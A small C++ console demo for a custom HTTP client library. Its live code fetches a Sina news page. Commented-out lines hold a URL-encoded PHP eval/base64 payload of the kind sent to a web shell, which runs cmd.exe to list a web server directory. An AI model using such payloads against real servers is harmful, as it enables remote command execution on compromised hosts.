// httpclientdemo.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "../httpclient/httpclient.h" //添加头文件引用  
#pragma comment(lib, "..\\..\\httpclient\\Release\\httpclient.lib") //添加lib文件引用   
int _tmain(int argc, _TCHAR* argv[])
{
	int sum=add(5,9);
	printf("sum==%d\n",sum);
	http_client_init();
	string Urlstr="http://news.sina.com.cn/c/xl/2018-05-16/doc-ihapkuvm5960657.shtml";
	//string Pdata="c=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=Y21k&z2=Y2QgL2QgIkQ6XHhhbXBwXGh0ZG9jc1wiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D";
	//string Pdata="c=%40eval%28%22dir%22%29";
	 string Pdata="c=$s=\'rrrsd\';print($s);";
	string Rdata;
	int ret= http_client_get(  Urlstr , Rdata);

	printf("ret=%d\r\nRdata=%s\r\n",ret,Rdata.c_str());


	return 0;
}

